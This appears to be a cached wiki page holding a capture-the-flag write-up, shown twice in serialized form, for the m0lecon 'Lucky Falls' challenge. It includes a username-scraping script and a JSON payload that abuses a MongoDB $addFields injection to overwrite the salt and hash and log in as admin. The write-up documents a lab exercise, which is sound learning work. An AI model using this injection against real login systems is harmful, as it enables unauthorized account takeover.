a:5:{i:0;a:3:{i:0;s:14:"document_start";i:1;a:0:{}i:2;i:0;}i:1;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:6:"mdpage";i:1;a:1:{s:6:"render";b:0;}i:2;i:1;i:3;s:10:"<markdown>";}i:2;i:1;}i:2;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:6:"mdpage";i:1;a:3:{s:6:"render";b:1;s:5:"match";s:3307:"
# Lucky Falls
### http://lucky-fall.challs.m0lecon.it/

This challenge prompts us with some text, a login box and a falling leaf.  
By analyzing the code we can deduct that the falling leaf is an obscure reference to mongoDB.

------------
## Solution

- First of all we can see that every time we reload the page we get a new username put in the header text, so we can write a simple script to dump all the usernames:

### Code

```python
from requests import Session
from os.path import exists
from os import makedirs
def parse_username(html: str) -> str:
    # Bit of a shitty way but idc
    return html.split('<div class="text-center flex-grow-1 text-nowrap">')[2].split("</div>", 1)[0]


def scrape_usernames(no_progress_max: int = 30) -> dict:
    url = "http://lucky-fall.challs.m0lecon.it/"
    np = 0
    usernames = {}  # {username: html_page}
    with Session() as sess:
        while np < no_progress_max:
            np += 1
            with sess.get(url) as uname_req:
                html = uname_req.text
                username = parse_username(html)
                if username not in usernames:
                    usernames.update({username: html})
                    np = 0
    return usernames


def main():
    unames = scrape_usernames()
    unames_file = open("found_usernames.txt", 'w')

    if not exists("./htmls/"):
        makedirs("./htmls/")

    for username in unames:
        unames_file.write(username + '\n')
        with open("./htmls/" + username + ".html", 'w') as html_file:
            html_file.write(unames[username])


if __name__ == "__main__":
    main()
```

- Once we have all the usernames we can start analyzing the htmls for each username and see that they are all identical, nice
- We can start trying some stuff out, like malforming the request
- The request body that the server expects is `{"name":"","password":""}`
- By not sending the username/password we can dump some of the background flask code
- We can see that no username dumps out this string `user = users.aggregate([{"$match": {"user": request.json["name"]}}, {"$addFields": request.json}]).next() KeyError: 'name' ` 
- We can see that no password dumps out this string `if sha256(user["password"] + user["salt"]) == user["hash"]:` (Welp the chall broke during this writeup so i dont have the exact string)
- Now, by analyzing the first string we can see that basically any key we send gets added to the user dict, and this happens right after the database request so we can easily overwrite the request with our stuff

- To get the flag we can send this malformed request: `{"name": "admin", "password": "ciao", "salt": "", "hash": "b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2"}`
    
Basically what is happening is that we are:  
- sending the username "admin" that we got by scraping the usernames before 
- we send a password of our choice (In this case "ciao") 
- we overwrite the databases salt with our own salt (In this case we left it blank)
- we are sending our own password hash which is a sha256 hash of "ciao"

This works because of the addfields inside the aggregate function, which basically adds and overwrites keys in a mongodb response.  
Addfields is done after the database has returned its data, this makes it so we can manipulate said data.
";s:3:"pos";i:1;}i:2;i:3;i:3;s:3307:"
# Lucky Falls
### http://lucky-fall.challs.m0lecon.it/

This challenge prompts us with some text, a login box and a falling leaf.  
By analyzing the code we can deduct that the falling leaf is an obscure reference to mongoDB.

------------
## Solution

- First of all we can see that every time we reload the page we get a new username put in the header text, so we can write a simple script to dump all the usernames:

### Code

```python
from requests import Session
from os.path import exists
from os import makedirs
def parse_username(html: str) -> str:
    # Bit of a shitty way but idc
    return html.split('<div class="text-center flex-grow-1 text-nowrap">')[2].split("</div>", 1)[0]


def scrape_usernames(no_progress_max: int = 30) -> dict:
    url = "http://lucky-fall.challs.m0lecon.it/"
    np = 0
    usernames = {}  # {username: html_page}
    with Session() as sess:
        while np < no_progress_max:
            np += 1
            with sess.get(url) as uname_req:
                html = uname_req.text
                username = parse_username(html)
                if username not in usernames:
                    usernames.update({username: html})
                    np = 0
    return usernames


def main():
    unames = scrape_usernames()
    unames_file = open("found_usernames.txt", 'w')

    if not exists("./htmls/"):
        makedirs("./htmls/")

    for username in unames:
        unames_file.write(username + '\n')
        with open("./htmls/" + username + ".html", 'w') as html_file:
            html_file.write(unames[username])


if __name__ == "__main__":
    main()
```

- Once we have all the usernames we can start analyzing the htmls for each username and see that they are all identical, nice
- We can start trying some stuff out, like malforming the request
- The request body that the server expects is `{"name":"","password":""}`
- By not sending the username/password we can dump some of the background flask code
- We can see that no username dumps out this string `user = users.aggregate([{"$match": {"user": request.json["name"]}}, {"$addFields": request.json}]).next() KeyError: 'name' ` 
- We can see that no password dumps out this string `if sha256(user["password"] + user["salt"]) == user["hash"]:` (Welp the chall broke during this writeup so i dont have the exact string)
- Now, by analyzing the first string we can see that basically any key we send gets added to the user dict, and this happens right after the database request so we can easily overwrite the request with our stuff

- To get the flag we can send this malformed request: `{"name": "admin", "password": "ciao", "salt": "", "hash": "b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2"}`
    
Basically what is happening is that we are:  
- sending the username "admin" that we got by scraping the usernames before 
- we send a password of our choice (In this case "ciao") 
- we overwrite the databases salt with our own salt (In this case we left it blank)
- we are sending our own password hash which is a sha256 hash of "ciao"

This works because of the addfields inside the aggregate function, which basically adds and overwrites keys in a mongodb response.  
Addfields is done after the database has returned its data, this makes it so we can manipulate said data.
";}i:2;i:11;}i:3;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:6:"mdpage";i:1;a:1:{s:6:"render";b:0;}i:2;i:4;i:3;s:11:"</markdown>";}i:2;i:3318;}i:4;a:3:{i:0;s:12:"document_end";i:1;a:0:{}i:2;i:3318;}}